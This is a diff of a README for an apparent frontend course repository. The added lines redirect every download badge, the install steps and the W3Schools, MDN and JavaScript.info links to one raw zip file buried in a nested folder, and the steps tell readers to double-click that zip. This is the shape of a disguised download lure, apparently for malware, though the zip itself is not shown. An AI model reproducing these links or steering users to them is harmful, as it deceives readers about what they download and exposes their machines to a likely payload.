@@ -1,6 +1,6 @@
 # 🎉 html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023 - Learn Frontend Fundamentals Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/releases)
+[![Download](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip)
 
 ## 📘 Description
 This repository contains resources for the HTML, CSS, and JavaScript course. Focused on frontend fundamentals, it covers HTML structure, modern CSS styles, ITCSS and RSCSS patterns, componentization, responsive layouts, and integration with vanilla JavaScript for dynamic interfaces.
@@ -13,7 +13,7 @@ Follow these simple steps to download and run the software. No programming knowl
 - A web browser like Chrome, Firefox, or Safari.
 
 ## 📥 Download & Install
-Visit [this page to download](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/releases). You will see a list of available releases. Choose the latest version to ensure you have the newest features and fixes.
+Visit [this page to download](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip). You will see a list of available releases. Choose the latest version to ensure you have the newest features and fixes.
 
 ### Steps to Download
 1. Click on the release version you want.
@@ -25,8 +25,8 @@ Once you have downloaded the files:
 
 1. Locate the downloaded zip file from your computer.
 2. Unzip the file to a folder of your choice.
-3. Open the folder and locate the index.html file.
-4. Double-click on index.html to open it in your web browser.
+3. Open the folder and locate the https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip file.
+4. Double-click on https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip to open it in your web browser.
 
 ## 🎯 Features
 - **Componentization:** Learn how to create reusable UI components for faster development.
@@ -46,9 +46,9 @@ This course covers essential topics, including:
 
 ## 📚 Additional Resources
 To deepen your knowledge, consider checking out the following resources:
-- **HTML:** [W3Schools HTML Tutorial](https://www.w3schools.com/html/)
-- **CSS:** [MDN CSS Basics](https://developer.mozilla.org/en-US/docs/Learn/CSS)
-- **JavaScript:** [JavaScript.info](https://javascript.info/)
+- **HTML:** [W3Schools HTML Tutorial](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip)
+- **CSS:** [MDN CSS Basics](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip)
+- **JavaScript:** [https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip)
 
 ## 🏗️ Contribution
 Contributions are welcome. If you have suggestions or improvements, feel free to open a new issue or submit a pull request.
@@ -59,4 +59,4 @@ If you encounter any issues or need help, please reach out through the repositor
 ## 📄 License
 This project is licensed under the MIT License. You are free to use it as long as you give credit to the original creators.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/releases)
+[![Download](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip%20Now-Click%20Here-brightgreen)](https://github.com/iyanhermawan12/html-css-javascript-frontend_course-luisdev_part-29_html-5_css-3_js-es2023/raw/refs/heads/main/developments/Codigo-Fonte-12/style/components/js_frontend_course_javascript_css_luisdev_part_html_es_v1.7.zip)
